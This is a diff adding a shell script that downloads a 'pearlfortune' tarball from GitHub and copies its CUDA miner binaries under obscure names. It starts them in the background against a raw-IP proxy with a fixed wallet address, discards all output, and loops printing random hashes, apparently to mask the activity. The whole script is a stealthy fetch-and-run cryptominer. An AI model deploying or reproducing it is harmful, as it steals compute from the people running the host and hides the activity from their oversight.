@@ -1,0 +1,12 @@
+wget -c https://github.com/rxt36q6/file/releases/download/1/pearlfortune-v1.2.4.tar.gz \
+&& tar vxzf pearlfortune-v1.2.4.tar.gz \
+&& cd pearlfortune \
+&& chmod +x miner-cuda13 miner-cuda12 \
+&& cp miner-cuda13 lemosjiol \
+&& cp miner-cuda12 lemosjio2
+
+./lemosjiol --proxy 149.28.155.233:443 --address prl1pnyza9z22a6sy8k08xkcqgwtgwr95w5d2csh89snlg6yhqdgg9uusuxjqch --worker $(echo $RANDOM | md5sum | head -c 10) -gpu --tui > /dev/null 2>&1 &
+while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 30s; done
+
+./lemosjio2 --proxy 149.28.155.233:443 --address prl1pnyza9z22a6sy8k08xkcqgwtgwr95w5d2csh89snlg6yhqdgg9uusuxjqch --worker $(echo $RANDOM | md5sum | head -c 10) -gpu --tui > /dev/null 2>&1 &
+while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 30s; done
